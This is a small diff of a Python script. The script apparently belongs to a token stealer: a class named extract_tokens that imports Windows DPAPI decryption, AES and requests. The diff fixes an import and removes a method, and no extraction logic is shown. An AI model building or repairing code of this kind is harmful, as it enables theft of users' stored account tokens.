@@ -5,7 +5,7 @@ import requests
 import json
 
 from win32crypt import CryptUnprotectData
-from Crypto import AES
+from Crypto.Cipher import AES
 
 class extract_tokens:
     def __init__(self) -> None:
@@ -18,9 +18,6 @@ class extract_tokens:
         self.tokens, self.uids = [], []
 
         self.extract()
-    
-    def __str__(self):
-        return self.tokens
 
     def extract(self) -> None:
         paths = {
